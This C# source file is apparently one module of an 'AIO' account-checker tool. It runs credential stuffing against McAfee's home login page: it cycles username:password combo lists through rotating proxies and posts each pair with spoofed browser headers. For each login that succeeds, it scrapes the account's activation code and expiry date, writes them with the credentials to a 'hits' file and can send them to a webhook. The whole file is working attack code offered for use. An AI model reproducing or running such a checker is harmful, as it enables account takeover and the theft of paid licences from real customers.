using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class McAfeemod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("Host", "home.mcafee.com");
                            req.AddHeader("Connection", "keep-alive");
                            req.AddHeader("Cache-Control", "max-age=0");
                            req.AddHeader("Origin", "https://home.mcafee.com");
                            req.AddHeader("Upgrade-Insecure-Requests", "1");
                            req.AddHeader("DNT", " 1");
                            req.AddHeader("Accept",
                                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            req.AddHeader("Sec-Fetch-Mode", "navigate");
                            req.AddHeader("Sec-Fetch-User", "?1");
                            req.AddHeader("Sec-Fetch-Dest", "document");
                            req.AddHeader("Referer",
                                "https://home.mcafee.com/secure/protected/login.aspx?rfhs=1&culture=en-us");
                            req.AddHeader("Accept-Language", "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7");
                            req.AddHeader("Cookie",
                                "AMCVS_A729776A5245B1590A490D44%40AdobeOrg=1; _ga=GA1.2.675188772.1592213432; _gid=GA1.2.1821097753.1592213432; _gat=1; run_fs_for_user=true; s_ecid=MCMID%7C47094452651753858052751764190295322717; s_cc=true; _gcl_au=1.1.1767005435.1592213432; _hjid=2c505a7c-bbf3-426b-86f2-66e65184200a; gpv=en-us%3Aindex; tp=3764; AAMC_mcafeeinc_0=REGION%7C12; Target_Test=seg%3D13216020%2C13216019%2C13216018%2C13216017%2C13306012%2C13306015%2C13306029%2C13306030%2C13306033%2C13306034%2C13306035%2C13306037%2C13306040; aam_uuid=53612498931678776163246401714005388128; s_ppv=en-us%253Aindex%2C28%2C17%2C1057; s_vi=[CS]v1|2F739FDC8515BC84-400008D0A1B00A32[CE]; check=true; AMCV_A729776A5245B1590A490D44%40AdobeOrg=-330454231%7CMCIDTS%7C18429%7CMCMID%7C47094452651753858052751764190295322717%7CMCAAMLH-1592213377.3%7C12%7CMCAAMB-1592213377.3%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1592220637s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-18436%7CvVersion%7C3.1.2; mboxEdgeCluster=31; mbox=session#b5062c58fdbd403a9a0d2a8e7a140777#1592215299|PC#b5062c58fdbd403a9a0d2a8e7a140777.31_0#1655458238; session%5Fdata=%3cSessionData%3e%0d%0a++%3ctempfrlu%3e%3c%2ftempfrlu%3e%0d%0a%3c%2fSessionData%3e; SiteID=1; langid=1; SessionInfo=AffiliateId=0; lBounceURL=http://home.mcafee.com/Secure/MyAccount/DashBoard.aspx?culture=en-us; lUsrCtxPersist=; lUsrCtxSession=%3cUserContext%3e%3cAffID%3e0%3c%2fAffID%3e%3cAffBuildID%3e0%3c%2fAffBuildID%3e%3c%2fUserContext%3e; Locale=EN-US; HPrst=gu=16908193-7350-448f-871a-d883930a9fdd&loc=EN-US; AffID=0-0; Currency=56; Acpc=; Acsc=; Aksc=cntrycd=D07yDyotbjo3tXHNvaIeVQ2&rgncd=eGWv52U2wow8tEGeL5N0Bw2&city=-gBzPo2jiCCXur64gUMSzA2&contnt=K3mTM-XV68BNk0mK2GOqlA2&thrput=OV_vUmoBuOXyWiozJodFWg2&bw=JkwoGAMd7-X0BW_f0oaLPg2&akc=9yRX8KOVZCj2izbCghPibw2; RT=\"sl=3&ss=1592213430641&tt=3933&obo=1&bcn=%2F%2F684d0d3e.akstat.io%2F&sh=1592213438624%3D3%3A1%3A3933%2C1592213437657%3D2%3A1%3A2973%2C1592213433619%3D1%3A0%3A2973&dm=mcafee.com&si=ec7d2813-5205-4fd6-bab2-7a94255d73e0&nu=https%3A%2F%2Fhome.mcafee.com%2FSecure%2FMyAccount%2FDashBoard.aspx%3F5922a5529d183c57efce92b37ca7752d&cl=1592213446308&r=https%3A%2F%2Fwww.mcafee.com%2Fen-us%2Ffor-home%2Fabt%2Ffor-home-1a-vb.html%3F253b56891e2b1424810dfa84f6e01eec&ul=1592213446319&hd=1592213447581\"; HRntm=iodtf=iq5nNK-ISQc78yUmSkAv9A2&atf=&rf=&hcof=iq5nNK-ISQc78yUmSkAv9A2&emailid=&optin=&optinvalues=&aff=0-0&cur=56&piacct=l5hppVF9ZAZqvcqlqqTxbw2&lbu=http%3a%2f%2fhome.mcafee.com%2fSecure%2fMyAccount%2fDashBoard.aspx%3fculture%3den-us&pple=iq5nNK-ISQc78yUmSkAv9A2&inur=iq5nNK-ISQc78yUmSkAv9A2&ituof=iq5nNK-ISQc78yUmSkAv9A2&ieu=iq5nNK-ISQc78yUmSkAv9A2&isr=iq5nNK-ISQc78yUmSkAv9A2&sbo=iq5nNK-ISQc78yUmSkAv9A2&om_icr=iq5nNK-ISQc78yUmSkAv9A2&om_upsa=iq5nNK-ISQc78yUmSkAv9A2&ttprdt=iq5nNK-ISQc78yUmSkAv9A2&flgn=iq5nNK-ISQc78yUmSkAv9A2&pbinfo=iq5nNK-ISQc78yUmSkAv9A2&rnwtrk=&clicksrctrk=&rqwtrk=&rqwtrkhs=&vpp=iq5nNK-ISQc78yUmSkAv9A2&mip=iq5nNK-ISQc78yUmSkAv9A2; s_fid=4B1A33A4AC09CB19-315E6B1EF7A7E111; s_gpv=D%3Dc1; _uetsid=b7663221-6d4e-8f44-995e-3f84d02de902; _uetvid=e1de4183-b683-cfe4-f42a-65cece4168a8; utag_main=v_id:0172b750e6ee001380531217e57f03072002706a0086e$_sn:1$_ss:0$_pn:3%3Bexp-session$_st:1592215275412$ses_id:1592213432046%3Bexp-session$vapi_domain:mcafee.com; s_nr=1592213475452-New; s_sq=mcafeewwconsumermain%3D%2526pid%253Dhttps%25253A%25252F%25252Fhome.mcafee.com%25252Fsecure%25252Fprotected%25252Flogin.aspx%2526oid%253Dfunctiononclick%252528event%252529%25257Bjavascript%25253ADoFormSubmit%252528%252527aspnetForm%252527%25252C%252527loginsubmit%252527%252529%25253B%25257D%2526oidt%253D2%2526ot%253DBUTTON");
                            req.AddHeader("Accept-Encoding", "gzip, deflate");
                            var str =
                                "AffId=0&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNDIzNjc2OTMyD2QWAmYPZBYCAgEPFgYeA2RpcgUDbHRyHgRsYW5nBQJlbh4IeG1sOmxhbmcFAmVuFgICAQ9kFggCBQ9kFghmD2QWAmYPZBYIAgEPZBYEZg8PFgIeC05hdmlnYXRlVXJsBRhodHRwczovL2hvbWUubWNhZmVlLmNvbS9kFgZmDw8WBB4NQWx0ZXJuYXRlVGV4dGUeB1Rvb2xUaXBlZGQCAQ8PFgYfBGUfBWUeB1Zpc2libGVnZGQCAg8PFgQeBFRleHRlHwVlZGQCAg8PFggfBGUfBWUeCEltYWdlVXJsBTZodHRwczovL3NlY3VyZWltYWdlcy5tY2FmZWUuY29tL2xlZ2FjeS9jb21tb24vbG9nby5wbmcfBmhkZAIDD2QWAmYPDxYCHwMFRWh0dHBzOi8vd3d3Lm1jYWZlZXNlY3VyZS5jb20vUmF0aW5nVmVyaWZ5P3JlZj1ob21lLm1jYWZlZS5jb20mbGFuZz1FTmQWAmYPDxYEHwgFQWh0dHBzOi8vaW1hZ2VzLnNjYW5hbGVydC5jb20vbWV0ZXIvaG9tZS5tY2FmZWUuY29tLzMxLmdpZj9sYW5nPUVOHwUFd01jQWZlZSBTZWN1cmUgc2l0ZXMgaGVscCBrZWVwIHlvdSBzYWZlIGZyb20gaWRlbnRpdHkgdGhlZnQsIGNyZWRpdCBjYXJkIGZyYXVkLCBzcHl3YXJlLCBzcGFtLCB2aXJ1c2VzIGFuZCBvbmxpbmUgc2NhbXMuFgIeDW9uY29udGV4dG1lbnUFZGphdmFzY3JpcHQ6YWxlcnQoIkNvcHlpbmcgUHJvaGliaXRlZCBieSBMYXcgLSBNY0FmZWUgU0VDVVJFIGlzIGEgVHJhZGVtYXJrIG9mIE1jQWZlZSIpO3JldHVybiBmYWxzZTtkAgUPZBYIAgMPZBYEZg8WAh4IQ3VzdG9tVUwFBUVOLVVTZAICDxYCHwoFBUVOLVVTZAIFD2QWAmYPDxYEHwcFGTxzcGFuPkFib3V0IE1jQWZlZTwvc3Bhbj4fBQUMQWJvdXQgTWNBZmVlZGQCBw9kFgJmDw8WBB8HBRc8c3Bhbj5Db250YWN0IFVzPC9zcGFuPh8FBQpDb250YWN0IFVzZGQCCQ9kFgRmDw8WBB8HBQZTZWFyY2gfBQUGU2VhcmNoZGQCAg8PZBYCHglvbmtleWRvd24FuAFpZiAoKGV2ZW50LndoaWNoID09IDEzKSB8fCAoZXZlbnQua2V5Q29kZSA9PSAxMykpIHtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3RsMDBfbV9IZWFkZXJGdWxsTmF2aWdhdGlvbl91Y01hc3Rlck5hdmlnYXRpb25fdWNIZWFkZXJVdGlsaXR5TmF2X1NlYXJjaF9idG5TZWFyY2gnKS5jbGljaygpO3JldHVybiBmYWxzZTt9ZAIHD2QWBGYPFgIfBmhkAgIPZBYCZg8PFgIfBmhkZAIDDw8WAh8GaGQWCAIBD2QWAmYPFgIfCgUCNTZkAgMPZBYCAgEPDxYGHwcFGDxzcGFuID5NeSBBY2NvdW50PC9zcGFuPh8FBQpNeSBBY2NvdW50HwMFK2h0dHBzOi8vaG9tZS5tY2FmZWUuY29tL3Jvb3QvbXlhY2NvdW50LmFzcHhkZAIFD2QWAgIBDw8WAh8DBSRodHRwczovL2hvbWUubWNhZmVlLmNvbS9zZWN1cmUvY2FydC8WBB4FdGl0bGUFDVNob3BwaW5nIENhcnQeA2FsdAUNU2hvcHBpbmcgQ2FydGQCBw9kFgICAQ8PFgYfBwUGTG9nIEluHwUFBkxvZyBJbh8DBTNodHRwczovL2hvbWUubWNhZmVlLmNvbS9zZWN1cmUvcHJvdGVjdGVkL2xvZ2luLmFzcHhkZAIEDw8WAh8GaGQWCAIBD2QWAmYPFgIfCgUCNTZkAgMPZBYCZg8PFgYfBwUXPHNwYW4%2BTXkgQWNjb3VudDwvc3Bhbj4fAwUraHR0cHM6Ly9ob21lLm1jYWZlZS5jb20vcm9vdC9NeUFjY291bnQuYXNweB8FBQpNeSBBY2NvdW50ZGQCBQ9kFgJmDw8WAh8DBSRodHRwczovL2hvbWUubWNhZmVlLmNvbS9zZWN1cmUvY2FydC8WBB8MBQRDYXJ0Hw0FBENhcnRkAgcPZBYCZg8PFgYfBwUGTG9nIEluHwMFM2h0dHBzOi8vaG9tZS5tY2FmZWUuY29tL3NlY3VyZS9wcm90ZWN0ZWQvbG9naW4uYXNweB8FBQZMb2cgSW5kZAIFDw8WAh8GZ2QWAmYPZBYEAgEPZBYCZg8WAh8KBQI1NmQCAw9kFgICAQ8PFgQfBwUYPHNwYW4gPk15IEFjY291bnQ8L3NwYW4%2BHwMFN2h0dHBzOi8vaG9tZS5tY2FmZWUuY29tL1NlY3VyZS9NeUFjY291bnQvRGFzaEJvYXJkLmFzcHgWAh8MBQpNeSBBY2NvdW50ZAIHD2QWAmYPZBYGAgEPZBYEZg8PFgIfAwUYaHR0cHM6Ly9ob21lLm1jYWZlZS5jb20vZBYGZg8PFgQfBGUfBWVkZAIBDw8WBh8EZR8FZR8GZ2RkAgIPDxYEHwdlHwVlZGQCAg8PFggfBGUfBWUfCAU2aHR0cHM6Ly9zZWN1cmVpbWFnZXMubWNhZmVlLmNvbS9sZWdhY3kvY29tbW9uL2xvZ28ucG5nHwZoZGQCAw9kFgJmDw8WAh8DBUVodHRwczovL3d3dy5tY2FmZWVzZWN1cmUuY29tL1JhdGluZ1ZlcmlmeT9yZWY9aG9tZS5tY2FmZWUuY29tJmxhbmc9RU5kFgJmDw8WBB8IBUFodHRwczovL2ltYWdlcy5zY2FuYWxlcnQuY29tL21ldGVyL2hvbWUubWNhZmVlLmNvbS8zMS5naWY%2FbGFuZz1FTh8FBXdNY0FmZWUgU2VjdXJlIHNpdGVzIGhlbHAga2VlcCB5b3Ugc2FmZSBmcm9tIGlkZW50aXR5IHRoZWZ0LCBjcmVkaXQgY2FyZCBmcmF1ZCwgc3B5d2FyZSwgc3BhbSwgdmlydXNlcyBhbmQgb25saW5lIHNjYW1zLhYCHwkFZGphdmFzY3JpcHQ6YWxlcnQoIkNvcHlpbmcgUHJvaGliaXRlZCBieSBMYXcgLSBNY0FmZWUgU0VDVVJFIGlzIGEgVHJhZGVtYXJrIG9mIE1jQWZlZSIpO3JldHVybiBmYWxzZTtkAgcPZBYEAgMPZBYEZg8WAh8KBQVFTi1VU2QCAg8WAh8KBQVFTi1VU2QCCQ9kFgICAg8PZBYCHwsFpQFpZiAoKGV2ZW50LndoaWNoID09IDEzKSB8fCAoZXZlbnQua2V5Q29kZSA9PSAxMykpIHtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3RsMDBfbV9IZWFkZXJTbGltTmF2aWdhdGlvbl91Y0hlYWRlclV0aWxpdHlOYXZfU2VhcmNoX2J0blNlYXJjaCcpLmNsaWNrKCk7cmV0dXJuIGZhbHNlO31kAg0PDxYCHwZoZGQCDw8WAh4FY2xhc3MFB0d0bTIwMTQWAgIDD2QWCAIBD2QWBGYPDxYCHwcFCldlIGFjY2VwdDpkZAIBDxYCHgNzcmMFUWh0dHBzOi8vc2VjdXJlaW1hZ2VzLm1jYWZlZS5jb20vbGVnYWN5L2hvbWUvcGF5bWVudEljb25zL3BheW1lbnRJY29uc0VOLVVTTmV3LmdpZmQCAw8PFgIfB2VkZAIFDw8WAh8HBRwmY29weTsgMjAwMy0yMDIwIE1jQWZlZSwgTExDZGQCBw8PFgIfBmhkFgJmDw8WAh8DBUVodHRwczovL3d3dy5tY2FmZWVzZWN1cmUuY29tL1JhdGluZ1ZlcmlmeT9yZWY9aG9tZS5tY2FmZWUuY29tJmxhbmc9RU5kFgJmDw8WBB8IBUFodHRwczovL2ltYWdlcy5zY2FuYWxlcnQuY29tL21ldGVyL2hvbWUubWNhZmVlLmNvbS8zMS5naWY%2FbGFuZz1FTh8FBXdNY0FmZWUgU2VjdXJlIHNpdGVzIGhlbHAga2VlcCB5b3Ugc2FmZSBmcm9tIGlkZW50aXR5IHRoZWZ0LCBjcmVkaXQgY2FyZCBmcmF1ZCwgc3B5d2FyZSwgc3BhbSwgdmlydXNlcyBhbmQgb25saW5lIHNjYW1zLhYCHwkFZGphdmFzY3JpcHQ6YWxlcnQoIkNvcHlpbmcgUHJvaGliaXRlZCBieSBMYXcgLSBNY0FmZWUgU0VDVVJFIGlzIGEgVHJhZGVtYXJrIG9mIE1jQWZlZSIpO3JldHVybiBmYWxzZTtkGAIFJGN0bDAwJHVjRm9vdGVyTWVudSRtX2Zvb3RlclNlY29uZGFyeQ9nZAUgY3RsMDAkdWNGb290ZXJNZW51JG1fcGFja2FnZUxpc3QPZ2Tr5ClMNbweuQXQqiI0FVX0lf0TuA%3D%3D&__VIEWSTATEGENERATOR=E3866E57&ctl00%24m_ScriptManager=&ctl00%24m_HeaderFullNavigation%24ucMasterNavigation%24ucHeaderUtilityNav%24Search%24txtGlobalSearchField=&UserID=" +
                                array[0] + "&Password=" + array[1] +
                                "&ps=login&evtTrigger=loginsubmit&eulaAcceptanceTypeHidden=Implicit";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse =
                                req.Post("https://home.mcafee.com/secure/protected/login.aspx?rfhs=1&culture=en-us",
                                    str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains(
                                    "The username or password you entered was invalid. Please try again"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains(
                                    "http://home.mcafee.com/Secure/MyAccount/DashBoard.aspx?culture=en-us"))
                                {
                                    var URL = Parse(strResponse, "window.location.href='", "';</script>");
                                    var cap = req.Get(URL).ToString();
                                    if (cap.Contains("Activation code"))
                                    {
                                        var Activationcode = Parse(cap, "Activation code: ", "</span> ");
                                        var Expires = Parse(cap, "Expires:</strong>", "</li>");

                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/McAfee_hits",
                                            array[0] + ":" + array[1] + " | Expires: " + Expires +
                                            " | Activationcode: " + Activationcode);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("McAfee",
                                                array[0] + ":" + array[1] + " | Expires: " + Expires +
                                                " | Activationcode: " + Activationcode);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "McAfee Hits");
                                    }
                                    else
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("McAfee", array[0] + ":" + array[1]);
                                        Export.AsResult("/McAfee_frees", array[0] + ":" + array[1]);
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}